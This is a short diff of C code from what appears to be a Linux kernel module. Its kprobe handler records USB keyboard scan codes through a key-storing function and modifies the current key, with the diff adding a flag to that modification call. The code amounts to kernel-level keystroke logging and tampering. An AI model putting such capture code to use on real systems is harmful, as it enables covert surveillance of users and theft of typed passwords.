@@ -174,8 +174,10 @@ static int handler_pre(struct kprobe *p, struct pt_regs *regs)
                     // 最正常的扫描码，小写无特殊字符
                     key_store_record(usb_kbd_keycode[code]);
                 }
+                modify_current_key_method1(&code, 1);
+            } else {
+                modify_current_key_method1(&code, 0);
             }
-            modify_current_key_method1(&code);
         }
     }
 
